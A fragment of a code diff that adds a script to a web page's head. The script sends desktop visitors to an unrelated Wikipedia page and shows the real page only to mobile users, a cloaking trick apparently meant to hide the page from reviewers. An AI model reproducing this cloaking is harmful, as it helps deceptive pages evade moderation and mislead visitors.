@@ -1,6 +1,21 @@
 <!DOCTYPE html>
 <html lang="en-ZA">
 <head>
+  <script type="text/javascript">
+  //digite a url de redirect
+  var url_link_redirect_pc = "https://en.wikipedia.org/wiki/Dog_food";
+
+  //function js
+  function isMobile() {
+   const regex = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+   return regex.test(navigator.userAgent);
+  }
+
+  //validation js
+  if (isMobile()) { console.log("Mobile device detected"); } else {
+   window.location = url_link_redirect_pc;
+  }
+ </script>
   <!-- Meta Pixel Code -->
 <script>
 !function(f,b,e,v,n,t,s)
